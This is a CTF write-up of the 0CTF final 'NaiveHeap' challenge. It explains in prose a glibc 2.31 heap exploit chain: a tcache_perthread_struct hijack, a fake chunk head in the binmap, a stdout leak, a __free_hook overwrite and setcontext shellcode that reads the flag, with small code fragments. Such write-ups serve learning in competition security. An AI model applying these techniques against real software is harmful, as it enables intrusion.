0CTF-NaiveHeap
<!--more-->

# Prologue

Last week, I took part in 0CTF final with my teammates@r3kapig and got 2nd place!

I'll introduce the only challenge I solved in the CTF: `NaiveHeap`. Because of lacking knowledge of output buffer, we solved it nearly one day after we exploit locally. After talking to the challenge writer, I fond mine solution is an unexcepted one: I use some `binmap` on `main_arena` as the head of faked chunk bypass a deadly crash by leaving a readable address. 

# Challenge

Glibc-2.31

It's a super simple binary. First, it will  use `seccomp` to disable `syscall_execve` and malloc so many times.

Second, the main part of the challenge, we have an infinite `while` loop to get our command.

0: Go to a backdoor to check if you have GIFT. Btw, GIFT is a flag, which allows you to free an arbitrary address(even we don't know any address) to start the exploit. 

not 0: we could `malloc` a chunk (size â‰¤0x100 ) and `read` some data. After reading, the chunk will be `free`.

# Solution

## First Step:

So it seems a simple challenge and we need to use GIFT to exploit it. For the first, we don't have much choice because we could only free some address with a chunk head or the binary will crash.

Thus, the first choice is `tcache_perthread_struct` as we could use malloc to fetch it and after `mallo` ,it will be `freed` so that we could get again. 

Now, we could malloc a chunk and free it to tcache and partial write its point by malloc 0x288 to get `tcache_perthread_struct`.

By modifying `tcache_perthread_struct`,  we could control the `counter` of every `tcache_entry`. 

And it's also easy to link arbitrary heap address in `tcache_entry` by partial write.

- `bitmap ( index , count_num )`
    
    It is a function will return a `counts` array. And set `counts[idx*2]==count_num` and idx is the index of `tcache_entry`.
    
    ```python
    def bits(index,k=1):
    	bitmap=[0]*0x80
    	bitmap[index]=k
    	bitmap=bytes(bitmap)
    	return bitmap
    ```
    

```jsx
add(0x98)
add(0x288,bitmap(8*2)+p64(0)*8+b'partial write')
```

## Third Step(1/16)

In order to leak libc-base address, we need to modify `stdout` to perform `IO_FILE LEAK` and what can we control now is the heap area. Thus, it's easy to perform `heap_overlap` on heap and fake a big chunk which could be freed to unsorted-bin so that we could get a `libc-address`. And we could `partially write` this address to make it point at arbitrary `libc-addess`. However, there is a big problem we need to solve before performing this step.

## Second Step

The problem is the binary will free the chunk after malloc so that a chunk-head is needed or binary would crash and return "free(): invalid pointer" because of the invalid chunk-head. By analyzing all the struct above `stdout` in `libc`, I find there is a struct could be used: `binmap` in `tcache`. And if we construct a large bin (size==0x670), there will be a usable chunk head (0x200) on the `binmap`. So that we could continue the exploit mentioned in third step.

- `binmap` is a `bitvector` recording whether bins are definitely empty
    
    

## Fourth Step

After third step, we need to overwrite the data on the `main_arena`, `_nl_global_locale`, and `stderr`.

And you will find if you overwrite the data to `\0` then the binary will crash while calling `strtol` because of `segfault`. In  `_nl_global_locale` +0x68, there is a point and we need to overwrite it with a readable point. So we need to bypass it.

I noticed we could use the `key` member of a `tcache_chunk` . Because it points to `tcache_perthread_struct` so it's 100% readable. Meanwhile, we could leave another `chunk-head` to continue our exploit: overwrite `stdout`.

# Final Step

We could overwrite the `stdout`, and sets its _flags and  `_IO_write_base` to perform `IO_LEAK`. After leaking the `libc-base` address, we could use `Frist Step` to write arbitrary address, such as `__free_hook`. Then, use `setcontext` to hijack the PC to run shellcode. Read the flag's name & `orw` flag.

# Remotely attack

While performing the remote attack, we find the server would not leak the address for the setting of `stdout-buffer` is the default setting. This problem stopped me for about 12hours.  However, my teammate @wang solved this by sending `0xe00 * b'\0'`! I have tested to send data to fill the buffer. However, I used `while loop` and `faild` . Luckily, with @wang's help, we solved it before the end of 0CTF!

# Summary

This challenge is a simple but hard challenge for my solution and there are only 4teams that solved this challenge before the end of 0CTF. I think I could do better next time because I was stopped by remote leak. If I know the leak-trick, we could be the 2nd solver. Finally, thank 0CTF and my teammates for giving a great weekend.
